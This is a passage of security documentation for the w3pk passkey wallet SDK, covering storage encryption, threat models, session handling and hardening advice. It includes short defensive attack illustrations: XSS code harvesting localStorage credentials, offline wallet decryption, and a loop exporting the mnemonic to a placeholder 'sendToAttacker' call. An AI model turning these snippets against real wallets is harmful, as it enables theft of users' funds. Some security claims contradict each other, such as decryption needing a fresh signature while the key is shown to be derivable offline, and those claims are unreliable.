- ✅ **Credential IDs are hashed** - attackers cannot easily enumerate credentials
- ✅ **Public key still stored** - needed for encryption key derivation (public keys are non-sensitive)
- ✅ **Defense in depth** - Even if XSS reads localStorage, sensitive data is encrypted

**Encryption details:**
```typescript
// Metadata key derivation
const keyMaterial = `w3pk-metadata-v1:${credentialId}`
const hash = SHA-256(keyMaterial)

const metadataKey = PBKDF2({
  keyMaterial: hash,
  salt: "w3pk-metadata-salt-v1",
  iterations: 100000,
  hash: "SHA-256",
  keyLength: 256
})

// Encryption
const encryptedUsername = AES-256-GCM(username, metadataKey)
const encryptedAddress = AES-256-GCM(address, metadataKey)
const hashedId = SHA-256(`w3pk-cred-id:${credentialId}`)
const publicKeyFingerprint = SHA-256(publicKey)
```

**Why this matters:**

**Before v0.7.4 - XSS correlation attack:**
```javascript
// Attacker injects malicious script
const credentials = Object.keys(localStorage)
  .filter(k => k.startsWith('w3pk_credential_'))
  .map(k => JSON.parse(localStorage[k]))

// ⚠️ Attacker now knows:
// - All usernames
// - All Ethereum addresses
// - Can correlate: "alice" → "0x1234..."
// - Can track user across different apps
```

**After v0.7.4 - XSS sees only encrypted data:**
```javascript
// Attacker injects malicious script
const credentials = Object.keys(localStorage)
  .filter(k => k.startsWith('w3pk_credential_'))
  .map(k => JSON.parse(localStorage[k]))

// ✅ Attacker only sees:
// - Hashed credential IDs (no user info)
// - Encrypted usernames (need credentialId to decrypt)
// - Encrypted addresses (need credentialId to decrypt)
// - Public key fingerprints (no correlation possible)
// - Cannot correlate users to addresses
```

**Important notes:**
1. **Credential ID still required for lookup** - The credential ID index stores original IDs (not encrypted) to enable O(1) lookups
2. **Search operations are slower** - Finding a credential by username/address requires decrypting all credentials (O(n))
3. **Not backward compatible** - Existing credentials must be re-registered (old plaintext credentials won't work)
4. **Session-based decryption** - Metadata is decrypted on-demand using the credential ID

**Threat model:**

| Attack Scenario | Before v0.7.4 | After v0.7.4 |
|-----------------|---------------|--------------|
| XSS reads localStorage | ❌ Full correlation exposed | ✅ Only encrypted data visible |
| XSS during active session | ❌ Can access wallet | ❌ Can still access wallet |
| File system access only | ⚠️ Username/address visible | ✅ Only encrypted metadata |
| File system + credential ID | ⚠️ Full access | ⚠️ Can decrypt metadata |

**Performance impact:**
- **Save credential:** ~10ms slower (encryption overhead)
- **Get by ID:** ~5ms slower (decryption overhead)
- **Get by username/address:** Much slower - O(1) → O(n) + decryption
- **Get all credentials:** ~N×5ms slower (decrypt each)

**Migration:**
No automatic migration is provided (by design). Users must:
1. Export their mnemonic before upgrading
2. Clear old credentials
3. Re-register with same mnemonic
4. New encrypted storage format will be used

This is a breaking change for security reasons - we don't want to risk accidentally leaving plaintext metadata.

### 4. Storage Architecture

Understanding where w3pk stores data and how browser security mechanisms protect it is critical for threat modeling.

#### Storage Layers

```
┌─────────────────────────────────────────────────────────────┐
│ Browser (Origin: https://example.com)                       │
│                                                              │
│  ┌────────────────────────────────────────────────────────┐ │
│  │ localStorage (Origin-Scoped)                           │ │
│  │ Key: w3pk_credential_<credentialId>                    │ │
│  │                                                          │ │
│  │ {                                                        │ │
│  │   "id": "credential-abc123",          // PUBLIC        │ │
│  │   "publicKey": "MFkw...AQAB",         // PUBLIC        │ │
│  │   "username": "alice",                 // PUBLIC        │ │
│  │   "ethereumAddress": "0x1234...",     // PUBLIC        │ │
│  │   "createdAt": 1234567890              // PUBLIC        │ │
│  │ }                                                        │ │
│  │                                                          │ │
│  │ ⚠️  All data here is PUBLIC - no secrets               │ │
│  │ ⚠️  Can be read by JavaScript on same origin           │ │
│  │ ⚠️  Stored in plaintext on disk                         │ │
│  └────────────────────────────────────────────────────────┘ │
│                                                              │
│  ┌────────────────────────────────────────────────────────┐ │
│  │ IndexedDB (Origin-Scoped)                              │ │
│  │ Database: w3pk                                          │ │
│  │ Store: wallets                                          │ │
│  │                                                          │ │
│  │ {                                                        │ │
│  │   "ethereumAddress": "0x1234...",     // PUBLIC        │ │
│  │   "encryptedMnemonic": "v1kT...x3Zp", // ENCRYPTED     │ │
│  │   "credentialId": "credential-abc123", // PUBLIC        │ │
│  │   "createdAt": 1234567890              // PUBLIC        │ │
│  │ }                                                        │ │
│  │                                                          │ │
│  │ ⚠️  Encrypted mnemonic requires decryption key          │ │
│  │ ⚠️  Key can be derived from localStorage metadata       │ │
│  │ ⚠️  Both needed for offline decryption                  │ │
│  └────────────────────────────────────────────────────────┘ │
│                                                              │
│  ┌────────────────────────────────────────────────────────┐ │
│  │ Memory (JavaScript Heap) - During Active Session       │ │
│  │                                                          │ │
│  │ Session Object {                                        │ │
│  │   mnemonic: "word1 word2 ... word12",  // PLAINTEXT    │ │
│  │   expiresAt: 1234567890,               // Timestamp    │ │
│  │   credentialId: "credential-abc123"    // Reference    │ │
│  │ }                                                        │ │
│  │                                                          │ │
│  │ ⚠️  Plaintext mnemonic in JavaScript memory             │ │
│  │ ⚠️  Accessible to all JavaScript in same context        │ │
│  │ ⚠️  Cleared on logout, browser close, or expiration     │ │
│  │ ⚠️  Never written to disk (unless OS swap/hibernate)    │ │
│  └────────────────────────────────────────────────────────┘ │
│                                                              │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│ Operating System / Hardware                                  │
│                                                              │
│  ┌────────────────────────────────────────────────────────┐ │
│  │ Secure Enclave / TPM / Hardware Authenticator          │ │
│  │                                                          │ │
│  │ WebAuthn Credential {                                   │ │
│  │   privateKey: <HARDWARE_PROTECTED>,    // SECRET       │ │
│  │   rpId: "example.com",                  // Bound       │ │
│  │   credentialId: "credential-abc123",    // PUBLIC      │ │
│  │   userHandle: "alice"                   // PUBLIC      │ │
│  │ }                                                        │ │
│  │                                                          │ │
│  │ ✅ Private key CANNOT be exported                       │ │
│  │ ✅ Operations happen inside secure hardware             │ │
│  │ ✅ Requires biometric/PIN for each signature            │ │
│  │ ✅ Survives OS reinstall (on some platforms)            │ │
│  └────────────────────────────────────────────────────────┘ │
│                                                              │
│  ┌────────────────────────────────────────────────────────┐ │
│  │ File System (Browser Profile Directory)                │ │
│  │                                                          │ │
│  │ ~/Library/Application Support/Google/Chrome/Default/   │ │
│  │   ├─ Local Storage/                                    │ │
│  │   │   └─ https_example.com_0.localstorage              │ │
│  │   │       → Contains credential metadata (plaintext)   │ │
│  │   │                                                      │ │
│  │   └─ IndexedDB/                                        │ │
│  │       └─ https_example.com_0/w3pk/                     │ │
│  │           → Contains encrypted wallet                   │ │
│  │                                                          │ │
│  │ ⚠️  Files stored on disk (not encrypted by browser)     │ │
│  │ ⚠️  OS-level encryption (FileVault/BitLocker) needed    │ │
│  │ ⚠️  Attacker with file access can copy both             │ │
│  └────────────────────────────────────────────────────────┘ │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

#### Browser Security Mechanisms

**Origin Isolation:**
- localStorage and IndexedDB are **automatically scoped** to origin
- `https://example.com` cannot access `https://attacker.com` storage
- Even subdomains are isolated: `app.example.com` ≠ `example.com`
- Protocol matters: `http://example.com` ≠ `https://example.com`

**WebAuthn Security:**
- Credentials are **cryptographically bound** to RP ID (domain)
- Browser enforces that credentials for `example.com` can only be used on `example.com`
- Even with stolen credential metadata, cannot use on different domain
- User sees domain in authentication prompt

**JavaScript Context:**
- All w3pk code runs in the same JavaScript context as page code
- No process isolation (unlike browser extensions)
- XSS or code injection has full access to w3pk API
- This is why XSS prevention is critical

#### Security Boundaries

**Strong Boundaries (Browser-Enforced):**
1. ✅ **Origin isolation** - Cannot access other domains' storage
2. ✅ **WebAuthn RP ID binding** - Credentials domain-locked
3. ✅ **Secure hardware** - Private keys cannot be exported

**Weak Boundaries (Application-Enforced):**
1. ⚠️ **SDK authentication gating** - Requires honest JavaScript
2. ⚠️ **Session management** - Can be bypassed by code injection
3. ⚠️ **requireAuth flag** - Trivially bypassable

#### Attack Surface by Storage Layer

| Storage Layer | What's Stored | Protection | Attack Surface |
|---------------|---------------|------------|----------------|
| **localStorage** | Credential metadata (public) | Origin isolation | ⚠️ XSS, file access |
| **IndexedDB** | Encrypted wallet | Origin isolation + AES-256-GCM | ⚠️ XSS, file access + decryption |
| **Memory** | Plaintext mnemonic (during session) | Process isolation (weak) | ❌ XSS, memory dumps |
| **Secure Enclave** | WebAuthn private key | Hardware protection | ✅ Very strong (HW attacks only) |
| **File System** | Browser profile directory | OS permissions | ⚠️ Malware, physical access |

#### Data Flow

**Registration:**
```
1. User clicks "Register"
2. SDK calls navigator.credentials.create()
3. Browser shows WebAuthn prompt → User provides biometric
4. Secure Enclave generates key pair
5. Browser returns: credentialId, publicKey
6. SDK generates mnemonic
7. SDK derives encryption key from credentialId + publicKey
8. SDK encrypts mnemonic with AES-256-GCM
9. SDK stores:
   - localStorage: credentialId, publicKey, address (plaintext)
   - IndexedDB: encryptedMnemonic (ciphertext)
10. Secure Enclave stores: privateKey (hardware-protected)
```

**Login (First Time):**
```
1. User clicks "Login"
2. SDK calls navigator.credentials.get()
3. Browser shows WebAuthn prompt → User provides biometric
4. Secure Enclave signs challenge with privateKey
5. Browser returns: signature
6. SDK verifies signature matches publicKey
7. SDK derives encryption key from credentialId + publicKey
8. SDK decrypts wallet from IndexedDB
9. SDK stores plaintext mnemonic in memory (session)
10. Session expires after configured duration
```

**Login (With Active Session):**
```
1. User clicks "Sign Transaction"
2. SDK checks: hasActiveSession() → true
3. SDK retrieves mnemonic from memory (no prompt)
4. SDK derives private key from mnemonic
5. SDK signs transaction
6. Transaction sent to network
(No biometric prompt - session is active)
```

**Login (Session Expired):**
```
1. User clicks "Sign Transaction"
2. SDK checks: hasActiveSession() → false
3. SDK triggers WebAuthn authentication
4. Browser shows prompt → User provides biometric
5. SDK decrypts wallet, creates new session
6. SDK signs transaction
```

#### File System Locations by Browser

**Chrome/Chromium (macOS):**
```
~/Library/Application Support/Google/Chrome/Default/
  ├─ Local Storage/leveldb/
  │   └─ https_example.com_0.localstorage
  └─ IndexedDB/
      └─ https_example.com_0/
```

**Chrome/Chromium (Windows):**
```
%LOCALAPPDATA%\Google\Chrome\User Data\Default\
  ├─ Local Storage\leveldb\
  └─ IndexedDB\
```

**Firefox (macOS):**
```
~/Library/Application Support/Firefox/Profiles/<profile>/
  ├─ webappsstore.sqlite  (localStorage)
  └─ storage/default/https+++example.com/  (IndexedDB)
```

**Safari (macOS):**
```
~/Library/Safari/LocalStorage/
~/Library/Safari/Databases/
```

**Security Implications:**
- Browser profile directories are **user-accessible** (not encrypted by browser)
- An attacker with user-level file access can copy these directories
- OS-level encryption (FileVault, BitLocker) is essential
- Malware running as user can access these files
- Cloud backup of browser profiles may expose data

#### Defense in Depth

**Layer 1: Browser Security**
- Origin isolation (strong)
- WebAuthn RP ID binding (strong)
- Process sandboxing (moderate)

**Layer 2: w3pk SDK**
- Authentication gating (moderate - requires honest JS)
- AES-256-GCM encryption (strong - but key is derivable)
- Session management (weak - bypassable)

**Layer 3: Operating System**
- File system permissions (moderate)
- Full disk encryption (strong - FileVault, BitLocker)
- User authentication (moderate - password quality varies)

**Layer 4: Hardware**
- Secure Enclave / TPM (very strong)
- Physical security (depends on user)

**Recommendation:**
- ✅ Enable full disk encryption (FileVault on macOS, BitLocker on Windows)
- ✅ Use strong device password (not just PIN)
- ✅ Lock device when away (auto-lock enabled)
- ✅ Keep browser updated (security patches)
- ✅ Use Content Security Policy to prevent XSS
- ✅ Consider dedicated browser profile for financial apps
- ✅ Don't sync browser profile to cloud for high-security use

### 4. Attack Scenario Analysis

#### ⚠️ Attack: Copy files and decrypt offline (Partial Success)

```javascript
// Attacker steals browser storage
const stolen = {
  encryptedMnemonic: "v1kT...x3Zp",
  credentialId: "credential-abc123",
  publicKey: "MFkw...EwYH...AQAB"
}

// Derive the encryption key (deterministic)
const key = deriveEncryptionKeyFromWebAuthn(credentialId, publicKey)
//          ✅ SUCCESS - Key derivation works offline

// Decrypt the wallet
const mnemonic = await decryptData(stolen.encryptedMnemonic, key)
//               ✅ SUCCESS - Wallet is now decrypted
```

**Result:** ⚠️ **Attack partially succeeds** - Attacker can decrypt the wallet offline

**However, to actually USE the wallet via w3pk SDK:**

```javascript
// Attacker tries to use the stolen mnemonic via SDK
const w3pk = new Web3Passkey()
await w3pk.login()
//         ^^^^^^
//         ❌ BLOCKED: Requires WebAuthn authentication
//         Browser shows authentication prompt
//         Attacker cannot provide user's biometric/PIN
```

**Key point:** The encryption protects data at rest, but the real security boundary is **SDK-enforced authentication**. An attacker who steals files can decrypt the mnemonic offline, but:
1. They still need to authenticate to use the SDK
2. Or they could import the mnemonic into another wallet (which is why users should protect their devices)

**Mitigation:** Use device encryption (FileVault, BitLocker) and strong device passwords as an additional layer.

#### ❌ Attack: JavaScript injection to read wallet

```javascript
// Malicious script tries to access wallet via SDK
const w3pk = new Web3Passkey()

// Try to login and access wallet
await w3pk.login()
//         ^^^^^^
//         BLOCKED: Browser shows WebAuthn authentication prompt
//         User sees requesting domain in the prompt
//         If domain is malicious, user should deny
//         User must explicitly provide biometric/PIN

// Even if user authenticates (phished), credentials are domain-scoped
// The attacker's malicious.com credential cannot decrypt
// wallets encrypted with legitimate.com credentials
```

**Result:** ❌ **Attack fails** - WebAuthn is domain-scoped, preventing cross-origin attacks

**However, if attack happens on the SAME domain (XSS):**

```javascript
// XSS attack on legitimate.com
if (w3pk.hasActiveSession()) {
  // If session is active, attacker can access wallet
  const mnemonic = await w3pk.exportMnemonic()
  sendToAttacker(mnemonic)  // ⚠️ SUCCESS during active session
}
```

**Result:** ⚠️ **Attack succeeds if session is active** - This is why:
- Short session durations are critical (`sessionDuration: 0.1` for 6 minutes)
- XSS prevention is essential (CSP, input sanitization)
- The `requireAuth` flag is important but not a security boundary (can be bypassed by XSS)

#### ❌ Attack: Steal credential metadata from another domain

```javascript
// Attacker creates phishing site: examp1e.com (note the "1")
// User has legitimate credential on: example.com

// Attacker steals credential metadata from example.com
const stolenCredentialId = "..."
const stolenPublicKey = "..."
const stolenEncryptedWallet = "..."

// Attacker can derive key and decrypt on their own server
const key = deriveEncryptionKeyFromWebAuthn(stolenCredentialId, stolenPublicKey)
const mnemonic = decryptData(stolenEncryptedWallet, key)

// BUT: To use via WebAuthn, attacker tries to authenticate on examp1e.com
await navigator.credentials.get({
  publicKey: {
    challenge: randomChallenge,
    rpId: "examp1e.com",  // Attacker's domain
    allowCredentials: [{
      id: stolenCredentialId,
      type: "public-key"
    }]
  }
})
//  ❌ BLOCKED: Browser enforces RP ID matching
//  Credential created for "example.com" cannot be used on "examp1e.com"
//  WebAuthn will not find any matching credentials
```

**Result:** ❌ **Attack fails** - WebAuthn credentials are cryptographically bound to the domain (RP ID)

## Encryption Strength

### Wallet Encryption (At Rest)

**Key Derivation:**
- **Algorithm:** PBKDF2-SHA256
- **Iterations:** 210,000 (OWASP 2023 recommendation)
- **Hash:** SHA-256
- **Salt:** Fixed value `"w3pk-salt-v4"` (version identifier)
- **Key Material:** Credential ID (32+ bytes) + Public Key (65-91 bytes)
- **Output:** 256-bit AES key

**Encryption:**
- **Algorithm:** AES-256-GCM
- **Key Size:** 256 bits
- **IV:** Random 12 bytes per encryption
- **Authentication Tag:** 16 bytes (automatic with GCM)
- **Additional Authenticated Data:** Ethereum address (for integrity)

**Entropy Analysis:**
- Credential IDs are cryptographically random (256+ bits of entropy)
- Public keys are derived from private keys (256 bits of entropy)
- Combined key material: ~512 bits of entropy
- PBKDF2 with 210k iterations provides protection against brute force

**Note on Fixed Salt:**
The salt is fixed (`"w3pk-salt-v4"`) rather than random per user. This is acceptable because:
- The credential ID itself provides uniqueness (32+ random bytes)
- Preimage attacks against PBKDF2-SHA256 are not practical
- The primary threat model is online authentication bypass, not offline brute force
- An attacker needs the actual credential metadata (not guessable)

### Backup Encryption (User-Controlled)

**Key Derivation:**
- **Algorithm:** PBKDF2-SHA256
- **Iterations:** 310,000 (OWASP 2025 recommendation) - **stronger than wallet encryption**
- **Hash:** SHA-256
- **Salt:** Random 32 bytes per backup (unique per backup)
- **Key Material:** User-chosen password
- **Output:** 256-bit AES key

**Encryption:**
- **Algorithm:** AES-256-GCM
- **Key Size:** 256 bits
- **IV:** Random 12 bytes per encryption
- **Authentication Tag:** 16 bytes (automatic with GCM)
- **Additional Authenticated Data:** Ethereum address (for integrity)

**Password Requirements:**
Enforced by `isStrongPassword()` utility:
- Minimum 12 characters
- Must include: uppercase, lowercase, numbers, special characters
- Not in common password list (password, 123456, qwerty, etc.)
- Strength score ≥ 50/100

**Why Higher Iterations for Backups:**
Backups are designed for offline storage and face different threat models:
- Wallet encryption: Protected by device security + SDK authentication
- Backup encryption: May be stored on USB drives, cloud, paper - offline brute force is the primary threat
- 310,000 iterations (OWASP 2025) provides additional protection against GPU-based attacks

**Brute Force Resistance:**
Assuming attacker has access to encrypted backup and modern GPU (RTX 4090):
- ~100,000 attempts/second at 310k iterations
- Weak password (40 bits entropy): Hours to days
- Strong password (60 bits entropy): Years to centuries
- Random 16 char password (100 bits entropy): Universe lifetime

## Session Management

### How Sessions Work

w3pk implements **secure in-memory sessions** for better UX. After initial authentication, the decrypted mnemonic is cached in memory for a configurable duration.

```typescript
// Configure session duration (default: 1 hour)
const w3pk = new Web3Passkey({
  sessionDuration: 1 // hours
})

// After login, operations work without repeated authentication
await w3pk.login()              // ✅ Requires biometric
await w3pk.deriveWallet(0)      // ✅ Uses session (no prompt)
await w3pk.exportMnemonic()     // ✅ Uses session (no prompt)
await w3pk.stealth.getKeys()    // ✅ Uses session (no prompt)

// Session expires after 1 hour - next operation will prompt
await w3pk.deriveWallet(1)      // ✅ Prompts for biometric (session expired)
```

### Session Security

w3pk supports **two types of sessions** (v0.8.2+):

1. **In-Memory Sessions** (default): RAM-only, cleared on page refresh
2. **Persistent Sessions** (opt-in): Encrypted in IndexedDB, survives page refresh

**In-Memory Session (default):**
- ✅ Decrypted mnemonic cached in RAM only
- ✅ Session expiration timestamp
- ✅ Credential ID
- ✅ Cleared on page refresh
- ✅ Cleared on logout
- ✅ Cleared when browser tab closes

**Persistent Session (opt-in):**
- ✅ Encrypted mnemonic in IndexedDB
- ✅ Survives page refresh
- ✅ Encrypted with WebAuthn-derived keys
- ✅ Time-limited expiration
- ✅ Only for STANDARD and YOLO modes
- ❌ NEVER persisted for STRICT mode

**What's NOT cached:**
- ❌ Private keys (derived on-demand)
- ❌ WebAuthn signatures (fresh each time)
- ❌ Encryption keys (derived from signatures)

**Security properties:**
- Default sessions exist **only in RAM** - never persisted to disk
- Persistent sessions **encrypted at rest** with WebAuthn-derived keys
- Automatically cleared after expiration
- Cleared on logout (both RAM and persistent)
- Can be manually cleared with `clearSession()`
- STRICT mode **always** requires fresh authentication (no persistence)

### Session Management API

```typescript
// Configure persistent sessions
const w3pk = createWeb3Passkey({
  sessionDuration: 1,        // In-memory session (1 hour)
  persistentSession: {
    enabled: true,           // Enable "Remember Me"
    duration: 168,           // 7 days (in hours)
    requireReauth: true      // Prompt on page refresh
  }
})

// Check if session is active
const hasSession = w3pk.hasActiveSession()

// Get remaining time (in seconds)
const remaining = w3pk.getSessionRemainingTime()

// Extend session by configured duration
w3pk.extendSession()

// Manually clear session (clears both RAM and persistent)
await w3pk.clearSession()

// Update session duration
w3pk.setSessionDuration(2) // 2 hours

// Disable sessions entirely (most secure)
const w3pkNoSessions = createWeb3Passkey({
  sessionDuration: 0,
  persistentSession: { enabled: false }
})

// Use STRICT mode to disable persistent sessions
const strictWallet = await w3pk.deriveWallet('STRICT')
// STRICT mode ALWAYS bypasses persistent sessions
```

### Force Authentication Option

Developers can require fresh authentication for specific operations, even when a session is active:

```typescript
// Force authentication for sensitive operations
await w3pk.exportMnemonic({ requireAuth: true })
await w3pk.signMessage('Transfer $1000', { requireAuth: true })
await w3pk.deriveWallet(5, { requireAuth: true })
await w3pk.stealth.getKeys({ requireAuth: true })

// Example: Context-based security
async function transferFunds(amount: number, recipient: string) {
  // Use STRICT mode for high-value transactions
  const mode = amount > 100 ? 'STRICT' : 'STANDARD'

  const result = await w3pk.signMessage(
    `Transfer ${amount} to ${recipient}`,
    { mode }
  )

  // ... submit transaction with result.signature
}

// Example: Time-based security
async function exportBackup() {
  // Always require fresh auth for backup exports
  const mnemonic = await w3pk.exportMnemonic({ requireAuth: true })

  // ... show mnemonic to user
}
```

**Use cases for `requireAuth: true`:**
- High-value transactions (amount-based)
- Exporting recovery phrases
- Changing critical settings
- Administrative operations
- Time-sensitive operations after long idle

### ⚠️ Important: `requireAuth` is NOT a Security Boundary

**Can `requireAuth` be bypassed?**
**Yes** - An attacker with JavaScript execution in your app can bypass this flag:

```javascript
// Attacker bypasses requireAuth
await w3pk.signMessage('Steal funds', { requireAuth: false })
```

**What `requireAuth` actually protects:**
- ✅ Honest users making mistakes (accidental clicks)
- ✅ Application-level policy enforcement
- ✅ User experience (confirmation for sensitive actions)
- ✅ Compliance requirements (audit trails)

**What `requireAuth` does NOT protect:**
- ❌ Code injection attacks (XSS)
- ❌ Malicious browser extensions
- ❌ Compromised dependencies
- ❌ Active attackers with JS execution

**The REAL security boundaries are:**

1. **WebAuthn Browser Prompt** (Strongest)
   - Cannot be bypassed without physical biometric/PIN
   - Browser-enforced, origin-bound
   - User sees requesting domain

2. **Session Expiration** (Strong)
   - Limits attack window to session duration
   - Attacker must act within time limit
   - Shorter sessions = smaller attack surface

3. **Signature-Based Encryption** (Strong)
   - Protects wallet at rest
   - File system access useless without authentication
   - Cannot decrypt without fresh signature

4. **`requireAuth` Flag** (Weak - UX/Policy Only)
   - Can be bypassed by code injection
   - Not a security boundary
   - Think: seatbelt, not bulletproof vest

**Example Attack Scenarios:**

```typescript
// Scenario: Malicious browser extension active session
// Attacker can steal mnemonic during session window
setInterval(async () => {
  if (w3pk.hasActiveSession()) {
    const mnemonic = await w3pk.exportMnemonic({ requireAuth: false })
    sendToAttacker(mnemonic) // ❌ Stolen!
  }
}, 1000)

// Mitigation: Very short sessions
const w3pk = new Web3Passkey({ sessionDuration: 0.1 }) // 6 minutes

// Scenario: XSS attack + expired session
await w3pk.exportMnemonic({ requireAuth: false })
// ✅ Session expired - user sees authentication prompt
// ⚠️  User might authenticate thinking it's legitimate

// Mitigation: User education + short sessions
```

**Recommendations for High Security:**

```typescript
// 1. Minimal session duration
const w3pk = new Web3Passkey({ sessionDuration: 0.1 }) // 6 min

// 2. Or disable sessions entirely
const w3pk = new Web3Passkey({ sessionDuration: 0 })

// 3. Combine with defense in depth:
// - Content Security Policy (prevent XSS)
// - Subresource Integrity (prevent CDN attacks)
// - Dependency auditing (prevent supply chain)
// - User education (recognize suspicious prompts)
```

### Session Threat Model

#### ✅ Session protected against:
1. **Disk access** - Session never written to storage
2. **Browser restart** - Session cleared automatically
3. **Tab close** - Memory freed immediately
4. **Automatic expiration** - Sessions timeout after configured duration

#### ⚠️ Session vulnerable to:
1. **Active browser exploitation** - If attacker has code execution in the same tab
2. **Memory dumps** - If attacker can dump browser process memory (requires elevated privileges)
3. **Physical access** - If device unlocked and session active

**Recommendation:** For maximum security, set `sessionDuration: 0` to require authentication for every operation. For better UX, use the default 1 hour session.

## Integration Best Practices

Since `requireAuth` and sessions can be bypassed by code execution, here are **essential security measures** to prevent attacks:

### 1. Build Verification

Verify the integrity of the w3pk package before using it in production:

```typescript
import { getCurrentBuildHash, verifyBuildHash } from 'w3pk'

// On application startup
const TRUSTED_HASH = 'bafybeiecegenbzltuaiel3i6z3azesl6y32ugicavyvasfeyddsbnuhzkq' // From GitHub releases

async function verifyW3pkIntegrity() {
  try {
    const currentHash = await getCurrentBuildHash()
    const isValid = await verifyBuildHash(TRUSTED_HASH)

    if (!isValid) {
      console.error('⚠️  W3PK build verification failed!')
      console.error('Expected:', TRUSTED_HASH)
      console.error('Got:', currentHash)

      if (process.env.NODE_ENV === 'production') {
        throw new Error('W3PK package integrity check failed')
      }
    } else {
      console.log('✅ W3PK build verified')
    }
  } catch (error) {
    console.error('Build verification error:', error)
  }
}

await verifyW3pkIntegrity()
```

**Best practices:**
- ✅ Store trusted hashes in your backend or secure configuration
- ✅ Verify on application startup
- ✅ Fail securely in production if verification fails
- ✅ Compare hashes from multiple sources (npm, CDN, GitHub releases)
- ✅ Use HTTPS when fetching build files
- ✅ Monitor for unexpected hash changes

**Where to get trusted hashes:**
1. GitHub releases (check signed release notes)
2. Official documentation
3. Multiple CDN sources for comparison
4. Build locally and compare: `pnpm build && pnpm build:hash`

See [Build Verification Guide](./BUILD_VERIFICATION.md) for detailed documentation.

---

### 2. Prevent XSS Attacks

#### Content Security Policy (CSP)

Add strict CSP headers to prevent script injection:

```html
<!-- In your HTML -->
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self';
               script-src 'self' 'nonce-{RANDOM}';
               style-src 'self' 'nonce-{RANDOM}';
               object-src 'none';
               base-uri 'self';
               form-action 'self';">
```

Or via HTTP headers:
```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{RANDOM}'; object-src 'none'
```

**Best practices:**
- ❌ Avoid `unsafe-inline` and `unsafe-eval`
- ✅ Use nonces for inline scripts
- ✅ Whitelist only trusted domains
- ✅ Use `strict-dynamic` for modern browsers

#### Input Sanitization

```typescript
// Sanitize all user inputs
import DOMPurify from 'dompurify'

function displayUsername(username: string) {
  // ❌ NEVER do this:
  element.innerHTML = username

  // ✅ DO this:
  element.textContent = username

  // ✅ OR if HTML needed:
  element.innerHTML = DOMPurify.sanitize(username)
}
```

#### Output Encoding

```typescript
// Encode data before display
function showTransaction(recipient: string) {
  // ✅ Use proper encoding
  const encoded = encodeURIComponent(recipient)

  // ✅ Or use framework escaping (React, Vue, etc.)
  return <div>{recipient}</div> // React auto-escapes
}
```

#### Framework-Specific Protection

**React:**
```typescript
// ✅ React auto-escapes by default
<div>{userInput}</div>

// ❌ Dangerous - only use for trusted content
<div dangerouslySetInnerHTML={{__html: userInput}} />
```

**Vue:**
```vue
<!-- ✅ Vue auto-escapes -->
<div>{{ userInput }}</div>

<!-- ❌ Dangerous -->
<div v-html="userInput"></div>
```

### 3. Defend Against Malicious Browser Extensions

#### Extension Isolation Strategies

```typescript
// 1. Detect suspicious extension behavior
function detectExtensionInjection() {
  const originalFetch = window.fetch
  let fetchModified = false

  setTimeout(() => {
    if (window.fetch !== originalFetch) {
      console.warn('Fetch API modified - possible extension interference')
      fetchModified = true
    }
  }, 100)

  return fetchModified
}

// 2. Protect sensitive operations with iframe isolation
function createIsolatedContext() {
  const iframe = document.createElement('iframe')
  iframe.sandbox = 'allow-same-origin allow-scripts'
  iframe.style.display = 'none'
  document.body.appendChild(iframe)

  // Use iframe's clean window context
  return iframe.contentWindow
}

// 3. Short sessions limit exposure
const w3pk = new Web3Passkey({
  sessionDuration: 0.1 // 6 minutes - limits extension attack window
})
```

#### User Education

Display warnings when detecting extensions:

```typescript
// Check for common wallet extension conflicts
const hasMetaMask = typeof window.ethereum !== 'undefined'
const hasExtensions = detectExtensionInjection()

if (hasExtensions) {
  showWarning(
    'Browser extensions detected. ' +
    'For maximum security, use a dedicated browser profile ' +
    'without extensions when accessing your wallet.'
  )
}
```

#### Browser Profile Recommendation

```typescript
// In your UI/documentation
const securityMessage = `
🔒 Security Recommendation:
- Create a dedicated browser profile for wallet operations
- Disable all browser extensions in this profile
- Use this profile only for financial transactions
`
```

### 4. Prevent Compromised Dependencies (Supply Chain)

#### Package Auditing

```bash
# Regular security audits
npm audit
npm audit fix

# Use audit in CI/CD
npm audit --audit-level=high

# Alternative: use pnpm or yarn for better security
pnpm audit
```

#### Lock File Integrity

```bash
# Always commit lock files
git add package-lock.json
git commit -m "Lock dependencies"

# Verify lock file in CI
npm ci  # Fails if package.json and lock mismatch
```

#### Subresource Integrity (SRI)

For CDN-loaded scripts:

```html
<!-- ✅ Use SRI hashes -->
<script
  src="https://cdn.example.com/w3pk.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
  crossorigin="anonymous">
</script>
```

Generate SRI hashes:
```bash
# Generate hash
curl https://cdn.example.com/w3pk.js | openssl dgst -sha384 -binary | openssl base64 -A
```

#### Dependency Monitoring

```json
{
  "scripts": {
    "postinstall": "npm audit",
    "security-check": "npx snyk test"
  }
}
```

Use security services:
- [Snyk](https://snyk.io/)
- [Socket](https://socket.dev/)
- [Dependabot](https://github.com/dependabot) (GitHub)

#### Minimal Dependencies

```typescript
// ❌ Avoid kitchen-sink libraries
import _ from 'lodash' // 70KB

// ✅ Import only what you need
import debounce from 'lodash.debounce' // 2KB
```

Review dependencies regularly:
```bash
# List dependency tree
npm list
pnpm list --depth=1

# Check package size
npx bundlephobia lodash
```

### 5. Prevent Code Injection

#### Secure Build Pipeline

```typescript
// In your build config (vite.config.ts, webpack.config.js)
export default {
  build: {
    // Minify and obfuscate
    minify: 'terser',
    terserOptions: {
      compress: {
        drop_console: true, // Remove console logs in production
      }
    },

    // Enable source maps only in development
    sourcemap: process.env.NODE_ENV === 'development',

    // Rollup security options
    rollupOptions: {
      external: ['crypto', 'buffer'], // Don't bundle Node.js modules
    }
  }
}
```

#### Runtime Integrity Checks

```typescript
// Detect if code has been tampered with
class IntegrityChecker {
  private checksum: string

  constructor() {
    // Store checksum of critical code at build time
    this.checksum = this.calculateChecksum()
  }

  private calculateChecksum(): string {
    // Calculate hash of critical functions
    const criticalCode = [
      w3pk.signMessage.toString(),
      w3pk.exportMnemonic.toString(),
    ].join('')

    return this.hash(criticalCode)
  }

  verify(): boolean {
    const currentChecksum = this.calculateChecksum()
    return currentChecksum === this.checksum
  }

  private hash(str: string): string {
    // Simple hash (use crypto.subtle.digest in production)
    let hash = 0
    for (let i = 0; i < str.length; i++) {
      hash = ((hash << 5) - hash) + str.charCodeAt(i)
